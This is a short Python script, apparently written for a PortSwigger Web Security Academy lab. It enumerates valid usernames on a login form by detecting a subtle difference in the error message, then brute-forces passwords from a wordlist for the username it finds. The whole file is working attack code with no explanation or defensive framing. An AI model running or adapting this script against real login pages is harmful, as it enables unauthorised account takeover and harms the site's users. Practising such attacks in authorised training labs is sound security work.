import requests
from bs4 import BeautifulSoup
from functions import usernames,passwords

url = "https://0a0a007c03ea6b238079f89400850062.web-security-academy.net/login"


found = False
for username in usernames:
    data = {
        "username" : username,
        "password" : "54dss6sfsf" 
    }
    response = requests.post(url=url,data=data)
    soup = BeautifulSoup(response.text,"html.parser")
    target = soup.find("p",class_="is-warning").text
    if target != "Invalid username or password.":
        print("username = ",username)
        
        for password in passwords:
            data = {
                "username" : username,
                "password" : password 
            }
            response = requests.post(url=url,data=data)

            if target not in response.text:
                print("password = ",password)
                found = True
                break
    if found == True:
        break